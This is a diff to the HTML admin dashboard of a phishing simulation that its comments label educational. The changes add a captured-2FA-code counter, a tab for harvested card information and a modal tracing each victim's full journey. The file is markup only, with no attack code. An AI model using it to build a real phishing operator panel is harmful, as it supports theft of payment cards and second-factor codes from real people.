@@ -12,11 +12,17 @@
    * cybersecurity education. Using this code for actual phishing
    * or any malicious purpose is illegal and unethical.
    -->
+
 <!DOCTYPE html>
 <html lang="en">
    <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+      <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+      <meta http-equiv="Pragma" content="no-cache">
+      <meta http-equiv="Expires" content="0">
+
       <title>Educational Phishing Dashboard</title>
       <link rel="stylesheet" href="../admin/styles.css">
       <link href="../sources/images/favicon.ico" rel="shortcut icon" />
@@ -39,6 +45,10 @@
                   <h3>Total Responses</h3>
                   <p id="total-responses">0</p>
                </div>
+               <div class="stat-card">
+                  <h3>2FA Codes</h3>
+                  <p id="total-2fa">0</p>
+               </div>
             </div>
          </div>
          <div class="educational-notice">
@@ -48,11 +58,13 @@
             <p><strong>Courriel:</strong> Akram.Nasr@cmontmorency.qc.ca</p>
             <p><strong>Purpose:</strong> This simulated page was created for educational purposes only to demonstrate phishing techniques and security vulnerabilities.</p>
          </div>
-         <h2>Captured Card Information</h2>
-         <div id="card-grid" class="card-grid">
-            <div class="loading-spinner">
-               <div class="spinner"></div>
-               <p>Loading data...</p>
+         <div id="card-tab" class="tab-content active">
+            <h2>Captured Card Information</h2>
+            <div id="card-grid" class="card-grid">
+               <div class="loading-spinner">
+                  <div class="spinner"></div>
+                  <p>Loading data...</p>
+               </div>
             </div>
          </div>
          <div class="footer">
@@ -73,6 +85,22 @@
                <div class="loading-spinner">
                   <div class="spinner"></div>
                   <p>Loading questions...</p>
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- Modal for full user journey -->
+      <div id="userJourneyModal" class="modal">
+         <div class="modal-content modal-large">
+            <div class="modal-header">
+               <h2 class="modal-title">Complete User Journey</h2>
+               <span class="close journey-close">&times;</span>
+            </div>
+            <div class="modal-body" id="user-journey-container">
+               <!-- User journey data will be loaded here -->
+               <div class="loading-spinner">
+                  <div class="spinner"></div>
+                  <p>Loading user journey data...</p>
                </div>
             </div>
          </div>
